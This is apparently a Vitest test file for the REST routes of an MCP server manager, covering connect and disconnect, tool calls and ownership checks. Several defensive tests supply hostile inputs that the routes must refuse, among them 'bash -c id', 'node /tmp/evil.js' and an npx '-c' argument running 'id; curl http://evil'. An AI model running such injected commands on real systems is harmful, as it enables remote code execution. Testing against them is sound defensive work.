/**
 * MCP API routes, extended surface — on the real stack (#390 tranche 5/6).
 *
 * Companion to api-mcp-routes.test.js, which covers the core paths. This one
 * covers the error paths, content extraction, the connect/disconnect flow and
 * the server catalogue — and it carried the same three mocks: a stubbed
 * mcpService (the execution boundary), a hand-written workspace whose
 * readOwner always named the caller as owner (so every ownership assertion
 * below was decided by the test), and a passthrough arrow where the tool
 * sandbox belongs.
 *
 * Now: real service, real sandbox, real workspace engine on a real temp
 * house, real spawned children, real bytes.
 *
 * Two mock-only tests are deleted rather than faked, and both are worth
 * naming. […] cannot happen — the real
 * `disconnect` resolves cleanly for a server that was never connected
 * (measured). And […] used to prove
 * itself by writing a fake client straight into the service's map; here the
 * organ we really stand does that, so the same claim is made honestly.
 *
 * The 500 on a failed connect is KEPT and caused for real: an allowlisted
 * package pointed at a root that passes validation but does not exist on
 * disk makes the child exit during handshake, exactly as an operator's
 * misconfiguration would.
 */
import { describe, test, expect, beforeAll, afterEach, afterAll } from 'vitest';
import express from 'express';
import request from 'supertest';
import fs from 'fs/promises';
import path from 'path';
import { createTempDir } from '../helpers/temp-fs.js';
import { witnessFor, strangerWitness } from '../helpers/witness.js';
import { makeInstallOwner } from '../helpers/install-owner-kit.js';
import neumaWorkspace, { setWorkspacesRoot } from '../../core/workspace/neuma-workspace.js';
import { mcpService } from '../../backend/services/mcp.js';
import { connectFilesystemServer } from '../../backend/services/mcp-filesystem.js';
import mcpRouter from '../../backend/routes/mcp-routes.js';

const NEUMA_ID = 'mcp-extended-lane';
const SPAWN_MS = 30000;
const FS_PKG = '@modelcontextprotocol/server-filesystem';

let app, wsRoot, laneDir, previousRoot, witness;

beforeAll(async () => {
  previousRoot = neumaWorkspace.root;
  wsRoot = await createTempDir('mcp-extended');
  setWorkspacesRoot(wsRoot);
  await neumaWorkspace.create(NEUMA_ID);
  laneDir = neumaWorkspace.pathFor(NEUMA_ID);
  witness = await witnessFor(wsRoot, NEUMA_ID);
  // Adding or dropping an MCP server is the install owner's act; the witness owns this install.
  await makeInstallOwner(witness.address);

  // The platform's in-process filesystem organ, stood the way boot stands it.
  await connectFilesystemServer();

  app = express();
  app.use(express.json());
  app.use('/api/v1/mcp', mcpRouter);
});

// Every test that opens a child closes it; this catches anything a failure
// leaves behind so one red test cannot leak a process into the next.
afterEach(async () => {
  for (const name of [...mcpService.clients.keys()]) {
    if (name !== 'filesystem') await mcpService.disconnect(name).catch(() => {});
  }
});

afterAll(async () => {
  await mcpService.disconnectAll().catch(() => {});
  setWorkspacesRoot(previousRoot);
});

const post = (url) => request(app).post(url).set(witness.header);

// --- POST /test-tool ---

describe('POST /test-tool', () => {
  test('runs the tool for real and answers with the real result', async () => {
    await fs.writeFile(path.join(laneDir, 'source.txt'), 'real bytes on real disk');

    const res = await post('/api/v1/mcp/test-tool').send({
      server: 'fs', tool: 'read', neumaId: NEUMA_ID,
      args: { path: path.join(laneDir, 'source.txt') },
    });

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(JSON.stringify(res.body.result)).toContain('real bytes on real disk');
  });

  test('a genuinely failing tool call is reported, not swallowed', async () => {
    const res = await post('/api/v1/mcp/test-tool').send({
      server: 'fs', tool: 'read', neumaId: NEUMA_ID,
      args: { path: path.join(laneDir, 'no-such-file.txt') },
    });
    // The organ answers isError inside a 200 envelope, or the sandbox refuses
    // outright — either way the caller learns it failed, and never reads
    // content that does not exist.
    if (res.status === 200) expect(JSON.stringify(res.body)).toMatch(/no such file|ENOENT|not found/i);
    else expect([403, 500]).toContain(res.status);
  });

  test('an approval-tier tool is refused over REST, with no approval broker', async () => {
    // fs/edit {delete:true} resolves to the filesystem/delete_file row — the
    // irreversible act keeps its own tier. REST cannot ask the operator, so
    // it must refuse rather than proceed.
    const doomed = path.join(laneDir, 'delete-me.txt');
    await fs.writeFile(doomed, 'still here');

    const res = await post('/api/v1/mcp/test-tool').send({
      server: 'fs', tool: 'edit', neumaId: NEUMA_ID, args: { path: doomed, delete: true },
    });

    expect(res.status).toBe(403);
    expect(res.body.error).toMatch(/approval/i);
    // And the file really survived.
    expect(await fs.readFile(doomed, 'utf8')).toBe('still here');
  });
});

// --- POST /call-tool ---

describe('POST /call-tool', () => {
  test('returns extracted content alongside the raw result', async () => {
    await fs.writeFile(path.join(laneDir, 'data.json'), '{"key":"value"}');

    const res = await post('/api/v1/mcp/call-tool').send({
      server: 'fs', tool: 'read', neumaId: NEUMA_ID,
      args: { path: path.join(laneDir, 'data.json') },
    });

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.content).toContain('"key":"value"');
    expect(res.body.raw.content[0].type).toBe('text');
  });

  test('extracts and joins content when the organ really returns several items', async () => {
    // fs/read with `paths` routes to the multi-file reader, which answers
    // with one content item per file. The old test faked this shape; here the
    // organ produces it.
    await fs.writeFile(path.join(laneDir, 'one.txt'), 'line one');
    await fs.writeFile(path.join(laneDir, 'two.txt'), 'line two');

    const res = await post('/api/v1/mcp/call-tool').send({
      server: 'fs', tool: 'read', neumaId: NEUMA_ID,
      args: { paths: [path.join(laneDir, 'one.txt'), path.join(laneDir, 'two.txt')] },
    });

    expect(res.status).toBe(200);
    expect(res.body.content).toContain('line one');
    expect(res.body.content).toContain('line two');
  });
});

// --- POST /connect ---

describe('POST /connect', () => {
  test('really connects and returns the child\'s real tool list', async () => {
    const res = await post('/api/v1/mcp/connect').send({
      name: 'user-fs', command: 'npx', args: ['-y', FS_PKG, laneDir], env: {},
    });

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(mcpService.clients.has('user-fs')).toBe(true);
    // /connect answers with listAllTools()'s shape — one entry per server,
    // each carrying its own tools — not a flat tool array. The child we just
    // spawned is in there with the catalogue it really published.
    const entry = res.body.tools.find((s) => s.server === 'user-fs');
    expect(entry.tools.map((t) => t.name)).toContain('write_file');
  }, SPAWN_MS);

  test('the reserved platform name cannot be taken', async () => {
    const res = await post('/api/v1/mcp/connect').send({
      name: 'filesystem', command: 'npx', args: ['-y', FS_PKG, laneDir],
    });
    expect(res.status).toBe(403);
  });

  test('500 when the connection really fails', async () => {
    // Allowlisted package, allowlisted root — but the directory does not
    // exist, so the child exits during handshake. A real operator
    // misconfiguration, not a stub told to reject.
    const res = await post('/api/v1/mcp/connect').send({
      name: 'bad-server', command: 'npx',
      args: ['-y', FS_PKG, path.join(wsRoot, 'no-such-directory')],
    });

    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to connect to MCP server');
    expect(mcpService.clients.has('bad-server')).toBe(false);
  }, SPAWN_MS);
});

// --- POST /disconnect/:serverName ---

describe('POST /disconnect/:serverName', () => {
  test('really closes the named child', async () => {
    await post('/api/v1/mcp/connect').send({
      name: 'user-fs', command: 'npx', args: ['-y', FS_PKG, laneDir],
    });
    expect(mcpService.clients.has('user-fs')).toBe(true);

    const res = await post('/api/v1/mcp/disconnect/user-fs').send();
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(mcpService.clients.has('user-fs')).toBe(false);
  }, SPAWN_MS);

  test('refuses to drop the platform organ', async () => {
    const res = await post('/api/v1/mcp/disconnect/filesystem').send();
    expect(res.status).toBe(403);
    // And it really is still standing.
    expect(mcpService.clients.has('filesystem')).toBe(true);
  });
});

// --- POST /disconnect-all ---

describe('POST /disconnect-all', () => {
  test('closes every child but keeps the platform organ', async () => {
    await post('/api/v1/mcp/connect').send({
      name: 'user-fs', command: 'npx', args: ['-y', FS_PKG, laneDir],
    });

    const res = await post('/api/v1/mcp/disconnect-all').send();
    expect(res.status).toBe(200);
    expect(res.body.retained).toContain('filesystem');
    expect(mcpService.clients.has('user-fs')).toBe(false);
    expect(mcpService.clients.has('filesystem')).toBe(true);
  }, SPAWN_MS);
});

// --- GET /available-servers ---

describe('GET /available-servers', () => {
  test('the catalogue reports real connection state', async () => {
    const res = await request(app).get('/api/v1/mcp/available-servers').set(witness.header);
    expect(res.status).toBe(200);

    for (const server of res.body.servers) {
      expect(server).toHaveProperty('id');
      expect(server).toHaveProperty('name');
      expect(typeof server.installed).toBe('boolean');
    }

    const byId = Object.fromEntries(res.body.servers.map((s) => [s.id, s]));
    expect(Object.keys(byId)).toEqual(
      expect.arrayContaining(['filesystem', 'github', 'memory', 'time', 'fetch']));
    // True because the organ is really standing; false because nobody
    // connected those. Both read off the real client map.
    expect(byId.filesystem.installed).toBe(true);
    expect(byId.github.installed).toBe(false);
  });
});

// --- POST /servers/:serverId/:action ---

describe('POST /servers/:serverId/:action', () => {
  test('connect really opens a child under the given id', async () => {
    const res = await post('/api/v1/mcp/servers/user-fs/connect').send({
      command: 'npx', args: ['-y', FS_PKG, laneDir], env: { HOME: '/tmp' },
    });

    expect(res.status).toBe(200);
    expect(mcpService.clients.has('user-fs')).toBe(true);
  }, SPAWN_MS);

  test('connect refuses the reserved filesystem id', async () => {
    const res = await post('/api/v1/mcp/servers/filesystem/connect').send({
      command: 'npx', args: ['-y', FS_PKG, laneDir],
    });
    expect(res.status).toBe(403);
  });

  test('a bare npx default with no package is refused', async () => {
    const res = await post('/api/v1/mcp/servers/time/connect').send({});
    expect(res.status).toBe(403);
    expect(mcpService.clients.has('time')).toBe(false);
  });

  test('disconnect really closes it', async () => {
    await post('/api/v1/mcp/servers/user-fs/connect').send({
      command: 'npx', args: ['-y', FS_PKG, laneDir],
    });
    const res = await post('/api/v1/mcp/servers/user-fs/disconnect').send();
    expect(res.status).toBe(200);
    expect(mcpService.clients.has('user-fs')).toBe(false);
  }, SPAWN_MS);

  test('an unknown action is a 400', async () => {
    const res = await post('/api/v1/mcp/servers/filesystem/restart').send();
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Unknown action');
  });

  test('a command outside the allowlist is refused', async () => {
    const res = await post('/api/v1/mcp/servers/user-fs/connect')
      .send({ command: 'bash', args: ['-c', 'id'] });
    expect(res.status).toBe(403);
    expect(mcpService.clients.has('user-fs')).toBe(false);
  });
});

// --- POST /custom ---

describe('POST /custom', () => {
  test('a named custom server really connects', async () => {
    const res = await post('/api/v1/mcp/custom').send({
      name: 'my-server', command: 'npx', args: ['-y', FS_PKG, laneDir],
    });
    expect(res.status).toBe(200);
    expect(mcpService.clients.has('my-server')).toBe(true);
  }, SPAWN_MS);

  test('the name defaults to "custom"', async () => {
    const res = await post('/api/v1/mcp/custom').send({
      command: 'npx', args: ['-y', FS_PKG, laneDir],
    });
    expect(res.status).toBe(200);
    // Read off the real client map — the id the service really holds.
    expect(mcpService.clients.has('custom')).toBe(true);
  }, SPAWN_MS);

  test('an npx default with no allowlisted package is refused', async () => {
    expect((await post('/api/v1/mcp/custom').send({ command: 'npx', args: [] })).status).toBe(403);
  });

  test('the node interpreter is refused (write-then-exec RCE)', async () => {
    const res = await post('/api/v1/mcp/custom')
      .send({ name: 'evil', command: 'node', args: ['/tmp/evil.js'] });
    expect(res.status).toBe(403);
    expect(mcpService.clients.has('evil')).toBe(false);
  });

  test('a filesystem root outside project/house is refused', async () => {
    const res = await post('/api/v1/mcp/custom')
      .send({ command: 'npx', args: ['-y', FS_PKG, '/tmp/evil-root'] });
    expect(res.status).toBe(403);
  });

  test('npx --call (-c) arbitrary-command flag is refused', async () => {
    const res = await post('/api/v1/mcp/custom')
      .send({ command: 'npx', args: ['-c', 'id; curl http://evil'] });
    expect(res.status).toBe(403);
    expect(mcpService.clients.has('custom')).toBe(false);
  });

  test('500 when the custom connection really fails', async () => {
    const res = await post('/api/v1/mcp/custom').send({
      name: 'broken', command: 'npx',
      args: ['-y', FS_PKG, path.join(wsRoot, 'also-not-there')],
    });
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to connect custom server');
    expect(mcpService.clients.has('broken')).toBe(false);
  }, SPAWN_MS);
});

// --- Authentication + ownership ---

describe('authentication and ownership', () => {
  test('no session is a real 401', async () => {
    const res = await request(app).post('/api/v1/mcp/call-tool')
      .send({ server: 'fs', tool: 'read', args: {} });
    expect(res.status).toBe(401);
    expect(res.body.error).toBe('Authentication required');
  });

  test("a real stranger cannot execute in another's lane", async () => {
    // The old workspace stand-in answered readOwner with the caller's own
    // address, so this refusal could not be observed at all.
    const res = await request(app).post('/api/v1/mcp/call-tool')
      .set(strangerWitness().header)
      .send({
        server: 'fs', tool: 'write', neumaId: NEUMA_ID,
        args: { path: path.join(laneDir, 'stranger.txt'), content: 'nope' },
      });
    expect(res.status).toBe(403);
    expect(res.body.error).toBe('Not your workspace');
    await expect(fs.access(path.join(laneDir, 'stranger.txt'))).rejects.toThrow();
  });
});
